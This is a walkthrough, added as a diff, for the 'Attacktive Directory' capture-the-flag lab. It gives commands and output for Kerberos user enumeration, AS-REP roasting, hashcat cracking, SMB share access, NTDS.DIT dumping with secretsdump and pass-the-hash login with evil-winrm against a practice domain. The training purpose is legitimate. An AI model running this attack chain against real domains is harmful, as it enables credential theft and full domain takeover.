@@ -1,0 +1,180 @@
+ _____          _      _____ 
+/__   \__ _ ___| | __ |___ / 
+  / /\/ _` / __| |/ /   |_ \ 
+ / / | (_| \__ \   <   ___) |
+ \/   \__,_|___/_|\_\ |____/ 
+Welcome to Attacktive Directory
+
+*Mostly spoiler free*
+*If you really don't want spoilers be careful of jumping ahead!*
+
+  Add the domain to /etc/hosts:
+	sudo nano /etc/hosts
+	[machine IP] spookysec.local
+	
+Question 1: What tool will allow us to enumerate port 139/445?
+	    Hint: enum4____
+
+Question 2: What is the NetBIOS-Domain Name of the machine?
+            Syntax: enum4linux spookysec.local
+  
+  
+	 ===============================( Getting domain SID for spookysec.local )===============================
+                                                                                                                                                                                                                                            
+Domain Name: REDACTED                                                                                                                                                                                                          
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+
+Question 3: What invalid TLD do people commonly use for their Active Directory Domain? 
+	    Hint: TLD stands for top level domain. spookysec._____
+
+ _____          _      _  _   
+/__   \__ _ ___| | __ | || |  
+  / /\/ _` / __| |/ / | || |_ 
+ / / | (_| \__ \   <  |__   _|
+ \/   \__,_|___/_|\_\    |_|  
+Enumerating Users via Kerberos
+
+Question 1: What command within Kerbrute will allow us to enumerate valid usernames?
+            Hint: View the --help:
+            
+Available Commands:
+  bruteforce    Bruteforce username:password combos, from a file or stdin
+  bruteuser     Bruteforce a single user's password from a wordlist (use - for stdin)
+  help          Help about any command
+  passwordspray Test a single password against a list of users (use - for stdin)
+  REDACTED      Enumerate valid domain usernames via Kerberos from a list (use - for stdin)
+  version       Display version info and quit
+
+Question 2: What notable account is discovered? (These should jump out at you)
+Question 3: What is the other notable account is discovered? (These should jump out at you)
+            Syntax: (make sure to save the username list that's included in the task)
+
+└─$ ./kerbrute_linux_amd64\(1\) -d spookysec.local --dc spookysec.local  userenum adlist.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.2 (fd5f345) - 11/22/22 - Ronnie Flathers @ropnop
+
+2022/11/22 14:52:08 >  Using KDC(s):
+2022/11/22 14:52:08 >   spookysec.local:88
+
+2022/11/22 14:52:09 >  [+] VALID USERNAME:       james@spookysec.local
+2022/11/22 14:52:22 >  [+] VALID USERNAME:       REDACTED@spookysec.local
+2022/11/22 14:52:34 >  [+] VALID USERNAME:       James@spookysec.local
+2022/11/22 14:52:39 >  [+] VALID USERNAME:       robin@spookysec.local
+2022/11/22 14:53:39 >  [+] VALID USERNAME:       darkstar@spookysec.local
+2022/11/22 14:54:15 >  [+] VALID USERNAME:       administrator@spookysec.local
+2022/11/22 14:55:35 >  [+] VALID USERNAME:       REDACTED@spookysec.local
+2022/11/22 14:56:24 >  [+] VALID USERNAME:       paradox@spookysec.local
+2022/11/22 14:59:51 >  [+] VALID USERNAME:       JAMES@spookysec.local
+
+ _____          _      ____  
+/__   \__ _ ___| | __ | ___| 
+  / /\/ _` / __| |/ / |___ \ 
+ / / | (_| \__ \   <   ___) |
+ \/   \__,_|___/_|\_\ |____/ 
+Abusing Kerberos
+
+Question 1: We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?
+            Syntax: Try these, only one will produce a result:
+            python3 /opt/impacket/examples/GetNPUsers.py -no-pass spookysec.local/svc-admin
+            python3 /opt/impacket/examples/GetNPUsers.py -no-pass spookysec.local/backup
+
+Question 2: Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)
+            Hint: Search for "krb5asrep" on https://hashcat.net/wiki/doku.php?id=example_hashes
+            
+Question 3: What mode is the hash?
+            Hint: This is also listed on the wiki
+            
+Question 4: Now crack the hash with the modified password list provided, what is the user accounts password?
+	    Syntax: hashcat -m 18200 [hash file] [password list]
+
+ _____          _       __   
+/__   \__ _ ___| | __  / /_  
+  / /\/ _` / __| |/ / | '_ \ 
+ / / | (_| \__ \   <  | (_) |
+ \/   \__,_|___/_|\_\  \___/ 
+Back to the Basics
+
+Question 1: What utility can we use to map remote SMB shares?
+	    Hint: smb______
+	    
+Question 2: Which option will list shares?
+	    Hint: View the --help
+	    Usage: smbclient [OPTIONS] service <password>
+  -M, --message=HOST                           Send message
+  -I, --ip-address=IP                          Use this IP to connect to
+  -E, --stderr                                 Write messages to stderr instead of stdout
+  -REDACTED                                    Get a list of shares available on a host
+  -T, --tar=<c|x>IXFvgbNan                     Command line tar
+
+	  
+Question 3: How many remote shares is the server listing?
+	    Syntax: smbclient -L spookysec.local -U svc-admin  
+                
+Password for [WORKGROUP\svc-admin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backup          Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+Question 4: There is one particular share that we have access to that contains a text file. Which share is it?
+	    Hint: Which one doesn't have a comment?
+	    
+Question 5: What is the content of the file?
+	    Syntax: smbclient -U svc-admin //spookysec.local/backup 
+
+Password for [WORKGROUP\svc-admin]:
+Try "help" to get a list of possible commands.
+smb: \> 
+smb: \> more  REDACTED.txt
+
+Question 6: Decoding the contents of the file, what is the full contents?
+            Syntax: base64 -d [file]
+            
+ _____          _      _____ 
+/__   \__ _ ___| | __ |___  |
+  / /\/ _` / __| |/ /    / / 
+ / / | (_| \__ \   <    / /  
+ \/   \__,_|___/_|\_\  /_/   
+Elevating Privileges within the Domain
+
+Question 1: What method allowed us to dump NTDS.DIT?
+            Syntax: secretsdump.py spookysec.local/backup:[password]@[Machine IP]
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the {{REDACTED}} method to get NTDS.DIT secrets
+
+Question 2: What is the Administrators NTLM hash?
+            Syntax: Check the output
+            
+Question 3: What method of attack could allow us to authenticate as the user without the password?
+            Hint: ...420 lol
+            
+Question 4: Using a tool called Evil-WinRM what option will allow us to use a hash?
+	    Hint: evil-winrm -h
+	    
+ _____          _       ___  
+/__   \__ _ ___| | __  ( _ ) 
+  / /\/ _` / __| |/ /  / _ \ 
+ / / | (_| \__ \   <  | (_) |
+ \/   \__,_|___/_|\_\  \___/ 
+Flag Submission Panel 
+
+Question 1, 2, and 3:
+	    Syntax: evil-winrm -i [Machine IP] -u administrator -H [hash]
+	    Find the flags in each user's Desktop. Congrats!
